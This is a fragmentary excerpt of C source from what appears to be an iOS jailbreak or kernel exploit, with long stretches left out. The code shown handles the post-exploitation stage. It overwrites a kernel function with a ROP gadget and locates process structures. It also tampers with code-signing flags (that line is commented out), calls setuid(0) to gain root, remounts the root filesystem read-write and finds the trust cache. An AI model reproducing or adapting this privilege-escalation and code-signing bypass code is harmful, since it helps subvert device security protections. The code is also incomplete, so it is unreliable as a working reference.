...
zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
	...
	printf("[C0F3] Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
...
//			}
	...
	printf("[C0F3] our proc is at 0x%016llx\n", our_proc);
	printf("[C0F3] kern proc is at 0x%016llx\n", kern_proc);
...
//	kwrite32(our_proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
	...
	// setuid(0) + test
	{
		...
		printf("[C0F3] our uid was %d\n", getuid());
		
		setuid(0);
		
		printf("[C0F3] our uid is %d\n", getuid());
		
		FILE *f = fopen("/var/mobile/.root_C0F3", "w");
		if (f == 0) {
			printf("[C0F3] failed to write test file. something didn't work\n");
		} else {
			printf("[C0F3] wrote test file: %p\n", f);
		}
		fclose(f);
	}
	...
	// Remount / as rw - patch by xerub
	{
		...
		if (fd == -1) {
			...
			printf("[C0F3] file already exists!\n");
		}
		close(fd);
		
		printf("[C0F3] Did we mount / as read+write? %s\n", file_exist("/.C0F3") ? "yes" : "no");
	}
	
	
	
	uint64_t tc = find_trustcache();
	printf("[C0F3] trust cache at: %016llx\n", kread64(tc));
